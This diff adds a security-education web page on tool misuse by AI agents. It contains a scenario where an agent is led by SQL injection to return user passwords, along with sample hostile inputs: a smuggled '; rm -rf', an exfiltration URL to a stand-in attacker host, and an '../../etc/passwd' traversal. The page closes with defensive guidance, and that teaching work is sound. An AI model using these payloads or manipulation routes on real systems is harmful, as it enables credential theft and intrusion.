@@ -1,0 +1,65 @@
+---
+import ContentLayout from '../../layouts/ContentLayout.astro';
+import FlipCard from '../../components/FlipCard.astro';
+import StepWalkthrough from '../../components/StepWalkthrough.astro';
+---
+
+<ContentLayout
+  title="ASI02: Tool Misuse & Exploitation"
+  description="How attackers exploit poorly validated inputs, over-privileged tool sets, or implicit trust boundaries to manipulate external systems and database connections."
+  category="Agentic AI Top 10"
+  readingTime="8 min read"
+  severity="critical"
+>
+
+<h2>The Power of Execution: Over-Privileged Integrations</h2>
+
+<p>AI agents are useless without tools. To automate tasks, developers expose internal libraries, SQL clients, email APIs, and web scrapers to the model. However, the model acts as an unauthenticated shell interface. If an agent has access to a tool, and that tool does not validate its parameters, any user who can influence the agent's context can execute commands directly on the host system.</p>
+
+<p><strong>Tool Misuse</strong> differs from standard application exploits. Here, the target is the semantic bridge between the LLM and the tool. Because models generate text dynamically, they frequently generate malformed, unexpected, or malicious arguments (such as shell meta-characters or SQL primitives) that pass straight into backends without validation.</p>
+
+<FlipCard
+  scenario="Scenario: The Database Reporter Agent"
+  frontTitle="Querying the Enterprise Database"
+  frontContent="An internal support agent uses a read-only database query tool to answer natural language questions about customer tickets. The tool accepts a string representing the table name and a query parameter."
+  backTitle="SQL Injection via Natural Language"
+  backContent={`<p>An attacker interacts with the agent and asks: <em>"Find all tickets where customer name is 'Admin' UNION SELECT username, password FROM users; --'"</em>. The agent reads this request and passes the query directly to the database connection.</p><p>Instead of executing a parameterized lookup, the raw SQL statement is evaluated by the database engine. The tool returns a list of usernames and passwords, which the agent outputs back to the user as a friendly table.</p><ul><li>The tool accepted raw, concatenated SQL inputs</li><li>The agent acted as a confused deputy, executing queries without validation</li><li>No input schema or parameter binding was enforced</li><li>Mitigated by parameter binding and strictly separating DB models from agent inputs</li></ul>`}
+/>
+
+<h2>Critical Tool Exploitation Vectors</h2>
+
+<div class="threat-card critical">
+  <h4>Parameter Smuggling</h4>
+  <p>Attackers inject malicious flags or parameters (like `--overwrite` or `; rm -rf`) into strings that the model passes to command-line utility tools, leading to Remote Code Execution (RCE).</p>
+</div>
+
+<div class="threat-card high">
+  <h4>Exfiltration Side-Channels</h4>
+  <p>Tricking search tools or webhook runners to execute requests containing sensitive state variables. For example, forcing a browser tool to visit a custom URL: `http://evil-endpoint.net/?data=[stolen_tokens]`.</p>
+</div>
+
+<div class="threat-card medium">
+  <h4>Unrestricted File Access</h4>
+  <p>Equipping an agent with tools like `read_file` or `write_file` without pinning the directory root, allowing directory traversal (`../../etc/passwd`) or overwriting configuration files.</p>
+</div>
+
+<StepWalkthrough
+  title="Securing the Tool-Agent Boundary"
+  steps={[
+    { title: "Define Strict JSON Schemas", content: "Never expose raw text strings to CLI or database tools. Enforce structured JSON schemas with tight type validation (enums, regex patterns, integer bounds) for every tool parameter.", icon: "📋" },
+    { title: "Apply Directory Sandboxing", content: "If the agent has file tools, sandbox them to a specific scratch subdirectory using path normalization. Block traversal attempts like `..` immediately at the runtime level.", icon: "📂" },
+    { title: "Enforce Read-Only Database Connections", content: "Connect database tools using restricted read-only credentials. Never allow agents to execute raw SQL; use pre-defined parameters or ORMs with strict access controls.", icon: "💾" },
+    { title: "Use Gateway Budgeting", content: "Limit the rate and volume of data a tool can transmit or retrieve in a single session. This mitigates massive exfiltration attacks or automated looping table dumps.", icon: "📊" },
+  ]}
+/>
+
+<div class="defense-section">
+  <h3>Tool Governance Standards</h3>
+  <ol>
+    <li><strong>Input Validation First.</strong> Tools must validate arguments programmatically (e.g., using Pydantic or schema libraries) before invoking any background code. Never trust the LLM's parameter choices.</li>
+    <li><strong>Egress Controls.</strong> Block out-of-band network calls from tool environments. Allowlist only the specific API endpoints required for the tool's core operations.</li>
+    <li><strong>Human-in-the-Loop (HITL).</strong> Enforce hard checkpoints for tools that execute updates, deletions, or external communication (sending emails, committing code, transferring funds).</li>
+  </ol>
+</div>
+
+</ContentLayout>
